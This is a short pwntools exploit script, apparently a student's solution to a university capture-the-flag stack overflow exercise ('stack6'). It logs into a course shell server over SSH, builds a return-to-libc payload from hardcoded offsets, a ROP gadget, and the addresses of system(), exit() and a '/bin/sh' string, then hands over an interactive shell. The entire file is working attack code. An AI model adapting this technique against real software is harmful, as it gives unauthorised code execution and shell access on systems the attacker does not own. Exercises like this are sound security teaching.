#!/usr/bin/python
from pwn import *

context.clear(arch='i386', log_level='debug')
s = ssh('jjcabral', 'cs4401shell.walls.ninja', keyfile='jjcabral_ssh_key')
s.set_working_directory('/problems/stack6r_2_adac6be6738b5b08fa51e1b671eebb24/')
p = s.process('./stack6')

        
offset = 117
offset_eax = 129
rop_addr = 0x5655568c
system_addr = 0xf7e29f10
exit_addr =  0xf7e1d160
shell_addr = 0xf7f689db

payload = flat({offset:0x5655568c, offset_eax:0x5655568c}, system_addr, exit_addr, shell_addr)

p.sendline(payload) 
p.interactive()